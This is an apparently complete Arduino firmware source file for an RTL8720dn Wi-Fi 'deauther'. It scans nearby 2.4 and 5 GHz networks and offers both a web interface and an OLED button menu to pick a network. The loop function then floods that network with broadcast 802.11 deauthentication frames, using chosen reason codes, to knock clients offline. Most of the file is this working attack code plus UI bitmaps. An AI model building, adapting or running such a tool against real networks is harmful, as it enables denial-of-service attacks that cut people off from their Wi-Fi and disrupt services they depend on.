#undef max
#undef min
#include "vector"
#include "wifi_conf.h"
#include "map"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "debug.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"
#include <Wire.h>              
#include <Adafruit_GFX.h>      
#include <Adafruit_SSD1306.h>   
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
#define BTN_DOWN PA12
#define BTN_UP PA27
#define BTN_OK PA13
#define BTN_MENU PB2
String SSIDCh;
bool deatuher_rr = false;
int deauth_reason2 =0;
int deauth_reason3 = 0;
// Display code made by warwick

// LEDs:
//  Red: System usable, Web server active etc.
//  Green: Web Server communication happening
//  Blue: Deauth-Frame being sent
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
const unsigned char menu_attack [] PROGMEM = {
	0x3f, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xfc, 
	0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 
	0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 
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	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};
// '3', 128x64px
const unsigned char menu_select [] PROGMEM = {
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
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	0x3f, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xfc
};
// '2', 128x64px
const unsigned char menu_scan [] PROGMEM = {
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
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	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};
// 'Attackon', 92x64px
const unsigned char menuAttackon [] PROGMEM = {
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
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	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};
// 'Scanning', 128x64px
const unsigned char menuScanning [] PROGMEM = {
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
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	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};
// 'SSID', 60x64px
const unsigned char menuSSID [] PROGMEM = {
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
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	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};
typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint channel;
} WiFiScanResult;

char *ssid = "RTL8720dn-Deauther";
char *pass = "0123456789";

int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
WiFiServer server(80);
bool deauth_running = false;
uint8_t deauth_bssid[6];
uint16_t deauth_reason;

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) { 
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char*) record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

int scanNetworks() {
  DEBUG_SER_PRINT("Scanning WiFi networks (5s)...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    DEBUG_SER_PRINT(" done!\n");
    return 0;
  } else {
    DEBUG_SER_PRINT(" failed!\n");
    return 1;
  }
}

String parseRequest(String request) {
  int path_start = request.indexOf(' ') + 1;
  int path_end = request.indexOf(' ', path_start);
  return request.substring(path_start, path_end);
}

std::map<String, String> parsePost(String &request) {
    std::map<String, String> post_params;

    int body_start = request.indexOf("\r\n\r\n");
    if (body_start == -1) {
        return post_params;
    }
    body_start += 4;

    String post_data = request.substring(body_start);

    int start = 0;
    int end = post_data.indexOf('&', start);

    while (end != -1) {
        String key_value_pair = post_data.substring(start, end);
        int delimiter_position = key_value_pair.indexOf('=');

        if (delimiter_position != -1) {
            String key = key_value_pair.substring(0, delimiter_position);
            String value = key_value_pair.substring(delimiter_position + 1);
            post_params[key] = value;
        }

        start = end + 1;
        end = post_data.indexOf('&', start);
    }

    String key_value_pair = post_data.substring(start);
    int delimiter_position = key_value_pair.indexOf('=');
    if (delimiter_position != -1) {
        String key = key_value_pair.substring(0, delimiter_position);
        String value = key_value_pair.substring(delimiter_position + 1);
        post_params[key] = value;
    }

    return post_params;
}


String makeResponse(int code, String content_type) {
  String response = "HTTP/1.1 " + String(code) + " OK\n";
  response += "Content-Type: " + content_type + "\n";
  response += "Connection: close\n\n";
  return response;
}

String makeRedirect(String url) {
  String response = "HTTP/1.1 307 Temporary Redirect\n";
  response += "Location: " + url;
  return response;
}

void handleRoot(WiFiClient &client) {
  String html = "<html><head>";
  
  // CSS 스타일 추가
  html += "<style>";
  html += "body { font-family: Arial, sans-serif; background-color: #121212; color: #ddd; margin: 0; padding: 0; transition: background-color 0.3s; }";
  html += "h1, h2 { color: #f1f1f1; text-align: center; }";
  html += "table { width: 100%; margin-top: 20px; border-collapse: collapse; border-spacing: 0; }";
  html += "table th, table td { padding: 12px; text-align: left; border: 1px solid #555; }";
  html += "table tr:hover { background-color: #333; }";
  html += "button { background-color: #2196F3; border: none; padding: 12px 24px; color: white; font-size: 16px; border-radius: 12px; cursor: pointer; transition: transform 0.2s ease; margin-top: 20px; width: 100%; }";
  html += "button:hover { transform: scale(1.1); }";
  html += "button:active { transform: scale(0.95); }";
  html += "input[type='text'] { padding: 8px; font-size: 14px; border-radius: 8px; border: 1px solid #ccc; width: 100%; margin-top: 10px; }";
  html += ".container { width: 90%; margin: auto; padding: 20px; }";
  html += ".tooltip { position: relative; display: inline-block; border-bottom: 1px dotted #2196F3; cursor: pointer; }";
  html += ".tooltip .tooltiptext { visibility: hidden; width: 120px; background-color: #555; color: #fff; text-align: center; border-radius: 5px; padding: 5px; position: absolute; z-index: 1; bottom: 125%; left: 50%; margin-left: -60px; opacity: 0; transition: opacity 0.3s; }";
  html += ".tooltip:hover .tooltiptext { visibility: visible; opacity: 1; }";
  html += "@keyframes fadeIn { from { opacity: 0; transform: translateY(50px); } to { opacity: 1; transform: translateY(0); } }";
  html += ".fade-in { animation: fadeIn 1s ease-out; }";
  html += "@media (max-width: 600px) { table { font-size: 14px; } button { width: 100%; } }";
  html += "</style>";
  
  html += "</head><body>";
  
  // 페이지 콘텐츠
  html += "<div class='container fade-in'>";
  html += "<h1>RTL8720dn-Deauther</h1>";
  html += "<h2>WiFi Networks:</h2>";
  html += "<table><tr><th>Number</th><th>SSID</th><th>BSSID</th><th>Channel</th><th>RSSI</th><th>Frequency</th></tr>";
  
  // Wi-Fi 네트워크 목록 표시
  for (int i = 0; i < scan_results.size(); i++) {
    html += "<tr><td>" + String(i) + "</td><td>" + scan_results[i].ssid + "</td><td>" + scan_results[i].bssid_str + "</td><td>" + String(scan_results[i].channel) + "</td><td>" + String(scan_results[i].rssi) + "</td><td>" + ((scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz") + "</td></tr>";
  }
  html += "</table>";
  
  // 네트워크 스캔 버튼
  html += "<form method='post' action='/rescan'><button type='submit'>Rescan networks</button></form>";
  
  // Deauth 공격 설정 폼
  html += "<form method='post' action='/deauth'>";
  html += "Network Number: <input type='text' name='net_num'><br>";
  html += "Reason code: <input type='text' name='reason'><br>";
  html += "<button type='submit'>Launch Deauth-Attack</button>";
  html += "</form>";
  
  // Deauth 공격 중지 버튼
  html += "<form method='post' action='/stop'><button type='submit'>Stop Deauth-Attack</button></form>";
  
  // 이유 코드 설명 테이블
  html += "<h2>Reason codes</h2>";
  html += "<table><tr><th>Code</th><th>Meaning</th></tr>";
  html += "<tr><td>0</td><td>Reserved</td></tr>";
  html += "<tr><td>1</td><td>Unspecified reason</td></tr>";
  html += "<tr><td>2</td><td>Previous authentication no longer valid</td></tr>";
  html += "<tr><td>3</td><td>Deauthenticated because STA is leaving or has left IBSS/ESS</td></tr>";
  html += "<tr><td>4</td><td>Disassociated due to inactivity</td></tr>";
  html += "<tr><td>5</td><td>Disassociated because WAP device can't handle all STAs</td></tr>";
  html += "<tr><td>6</td><td>Class 2 frame received from nonauthenticated STA</td></tr>";
  html += "<tr><td>7</td><td>Class 3 frame received from nonassociated STA</td></tr>";
  html += "<tr><td>8</td><td>Disassociated because STA is leaving or has left BSS</td></tr>";
  html += "<tr><td>9</td><td>STA requesting association is not authenticated</td></tr>";
  html += "<tr><td>10</td><td>Disassociated due to unacceptable Power Capability element</td></tr>";
  html += "<tr><td>11</td><td>Disassociated due to unacceptable Supported Channels element</td></tr>";
  html += "<tr><td>12</td><td>Disassociated due to BSS Transition Management</td></tr>";
  html += "<tr><td>13</td><td>Invalid element</td></tr>";
  html += "<tr><td>14</td><td>Message integrity code (MIC) failure</td></tr>";
  html += "<tr><td>15</td><td>4-Way Handshake timeout</td></tr>";
  html += "<tr><td>16</td><td>Group Key Handshake timeout</td></tr>";
  html += "<tr><td>17</td><td>Invalid element in 4-Way Handshake</td></tr>";
  html += "<tr><td>18</td><td>Invalid group cipher</td></tr>";
  html += "<tr><td>19</td><td>Invalid pairwise cipher</td></tr>";
  html += "<tr><td>20</td><td>Invalid AKMP</td></tr>";
  html += "<tr><td>21</td><td>Unsupported RSNE version</td></tr>";
  html += "<tr><td>22</td><td>Invalid RSNE capabilities</td></tr>";
  html += "<tr><td>23</td><td>IEEE 802.1X authentication failed</td></tr>";
  html += "<tr><td>24</td><td>Cipher suite rejected due to security policy</td></tr>";
  html += "</table>";
  
  html += "</div>"; // .container
  html += "</body></html>";

  // 응답 작성
  String response = makeResponse(200, "text/html");
  response += html;
  client.write(response.c_str());
}
void handle404(WiFiClient &client) {
  String response = makeResponse(404, "text/plain");
  response += "Not found!";
  client.write(response.c_str());
}

void startDeauth(int network_num) {
  digitalWrite(LED_R, LOW);
  current_channel = scan_results[network_num].channel;
  wifi_off();
  delay(100);
  wifi_on(RTW_MODE_AP);
  WiFi.apbegin(ssid, pass, (char *) String(current_channel).c_str());
  deauth_running = true;
  memcpy(deauth_bssid, scan_results[network_num].bssid, 6);
  DEBUG_SER_PRINT("Starting Deauth-Attack on: " + scan_results[network_num].ssid + "\n");
  digitalWrite(LED_R, HIGH);
}
int ScrollIndex = 0;
void OLEDdeauth(){
  current_channel = scan_results[ScrollIndex].channel;
  wifi_off();
  delay(100);
  wifi_on(RTW_MODE_AP);
  WiFi.apbegin(ssid, pass, (char *) String(current_channel).c_str());
  memcpy(deauth_bssid, scan_results[ScrollIndex].bssid, 6);

}
String SelectedSSID;
void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_OK, INPUT_PULLUP);
  pinMode(BTN_MENU, INPUT_PULLUP);
  Serial.begin(115200);


  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("SSD1306 init failed"));
    while (true);  
  }
  display.clearDisplay();
  display.drawBitmap(0,0,menuScanning,128,64,WHITE);
  display.display();
  DEBUG_SER_INIT();
  WiFi.apbegin(ssid, pass, (char *) String(current_channel).c_str());
  if (scanNetworks() != 0) {
    while(true) delay(1000);
  }

  #ifdef DEBUG
  for (uint i = 0; i < scan_results.size(); i++) {
    DEBUG_SER_PRINT(scan_results[i].ssid + " ");
    for (int j = 0; j < 6; j++) {
      if (j > 0) DEBUG_SER_PRINT(":");
      DEBUG_SER_PRINT(scan_results[i].bssid[j], HEX);
    }
    DEBUG_SER_PRINT(" " + String(scan_results[i].channel) + " ");
    DEBUG_SER_PRINT(String(scan_results[i].rssi) + "\n");
  }
  #endif

  server.begin();
  SelectedSSID = scan_results[0].ssid;
  SSIDCh = scan_results[0].channel >= 36 ? "5G" : "2.4G";
  digitalWrite(LED_R, HIGH);
}
int menuState = 0;
bool okState = false;
bool menuScroll = true;

void loop() {
  WiFiClient client = server.available();
  if (client.connected()) {
    digitalWrite(LED_G, HIGH);
    String request;
    while(client.available()) {
      while (client.available()) request += (char) client.read();
      delay(1);
    }
    DEBUG_SER_PRINT(request);
    String path = parseRequest(request);
    DEBUG_SER_PRINT("Requested path: " + path + "\n");

    if (path == "/") {
      handleRoot(client);
    } else if (path == "/rescan") {
      client.write(makeRedirect("/").c_str());
      if (scanNetworks() != 0) {
        while(true) delay(1000);
      }
    } else if (path == "/deauth") {
      std::map<String, String> post_data = parsePost(request);
      int network_num;
      bool post_valid = true;
      if (post_data.size() == 2) {
        for (auto& param : post_data) {
          if (param.first == "net_num") {
            network_num = String(param.second).toInt();
          } else if (param.first == "reason") {
            deauth_reason = String(param.second).toInt();
          } else {
            post_valid = false;
            break;
          }
        }
      } else {
        post_valid = false;
      }
      client.write(makeRedirect("/").c_str());
      if (post_valid) {
        startDeauth(network_num);
      } else {
        DEBUG_SER_PRINT("Received invalid post request!\n");
      }
    } else if (path == "/stop") {
      deauth_running = false;
      DEBUG_SER_PRINT("Deauth-Attack stopped!");
      client.write(makeRedirect("/").c_str());
    } else {
      handle404(client);
    }

    client.stop();
    digitalWrite(LED_G, LOW);
  }
  if (deauth_running) {
    digitalWrite(LED_B, HIGH);
    wifi_tx_deauth_frame(deauth_bssid, (void *) "\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
    delay(50);
    digitalWrite(LED_B, LOW);
  }
  if (deatuher_rr) {
    if(digitalRead(BTN_OK)==LOW){
      menuState = 10;
      deatuher_rr = false;
    }
    deauth_reason = 1;
    deauth_reason2 = 4;
    deauth_reason3 = 16;
    wifi_tx_deauth_frame(deauth_bssid, (void *) "\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
    wifi_tx_deauth_frame(deauth_bssid, (void *) "\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason2);
    wifi_tx_deauth_frame(deauth_bssid, (void *) "\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason3);
    delay(10);
  }
  // OLED SSD1306
  if (menuState == 10){
    display.clearDisplay();
    delay(800);
    menuState = 0;
  }
  if (menuState == -3){
    if(digitalRead(BTN_DOWN)==LOW){
      if (ScrollIndex > 0){
        ScrollIndex--;
        SelectedSSID = scan_results[ScrollIndex].ssid;
        SSIDCh = scan_results[ScrollIndex].channel >= 36 ? "5G" : "2.4G";
      }
    }
    if(digitalRead(BTN_UP)==LOW){
      if (ScrollIndex < scan_results.size() - 1){
        ScrollIndex++;
        SelectedSSID = scan_results[ScrollIndex].ssid;
        SSIDCh = scan_results[ScrollIndex].channel >= 36 ? "5G" : "2.4G";
      }
    }
    menuScroll = false;
    DrawSSID();
  }
  if (menuState == -2){
    DrawScan();
  }
  if (menuState == -1){
    DrawAttack();
  }
  if (digitalRead(BTN_UP)==LOW){
    delay(150); //디바운스
    if (menuScroll){
      if (menuState < 3){
        menuState++;
      }
      if (menuState == 3){
        menuState = 2;
      }
    }
  }

  if (digitalRead(BTN_DOWN)==LOW){
    delay(150); //디바운스
    if (menuScroll){
      if (menuState > 0){
        menuState--;
      }
    }
  }
  if (menuState == 0){
    display.clearDisplay();
    display.drawBitmap(0,0,menu_attack,128,64,WHITE);
    display.display();
  }
  if (menuState == 1){
    display.clearDisplay();
    display.drawBitmap(0,0,menu_scan,128,64,WHITE);
    display.display();
  }
  if (menuState == 2){
    display.clearDisplay();
    display.drawBitmap(0,0,menu_select,128,64,WHITE);
    display.display();
  }
  if (digitalRead(BTN_OK)==LOW){
    delay(150);
    Serial.println("OK");
    if (!okState){
      if (menuState == 0){
        menuState = -1;
      }
      if (menuState == 1){
        menuState = -2;
      }
      if (menuState == 2){
        menuState = -3;
        
      }
      okState = true;
      menuScroll = false;
    }
    else if (okState){
      if (menuState == -1){
        menuState = 0;
      }
      if (menuState == -2){
        menuState = 1;
      }
      if (menuState == -3){
        menuState = 2;
      }
      okState = false;
      menuScroll = true;
    }
  }
}


void DrawSSID(){
  Serial.println(SelectedSSID);
  display.clearDisplay();
  display.drawBitmap(0,0,menuSSID,60,64,WHITE);
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(43,30 );
  if (SelectedSSID.length() == 0){
    display.print("#HIDDEN#");
  }
  else if (SelectedSSID.length() > 7){
    SelectedSSID = SelectedSSID.substring(0,10) + "..";
    display.print(SelectedSSID);
  }
  else display.print(SelectedSSID);
  display.setCursor(13,15);
  display.print(SSIDCh);
  display.setCursor(115,30);
  display.print(ScrollIndex);
  display.display();
  
}
void DrawScan(){
  display.clearDisplay();
  display.drawBitmap(0,0,menuScanning,128,64,WHITE);
  display.display();
  menuState = 1;
  okState = false;
  menuScroll = true;
  scanNetworks();
}
void DrawAttack(){
  display.clearDisplay();
  display.drawBitmap(0,0,menuAttackon,92,64,WHITE);
  display.setCursor(77,30);
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  if (SelectedSSID.length() == 0){
    display.print("#HIDDEN#");
  }
  else if (SelectedSSID.length() > 6){
    SelectedSSID = SelectedSSID.substring(0,6) + "..";
    display.print(SelectedSSID);
  }
  else display.print(SelectedSSID);
  display.display();
  OLEDdeauth();
  delay(10);
  deatuher_rr = true;
}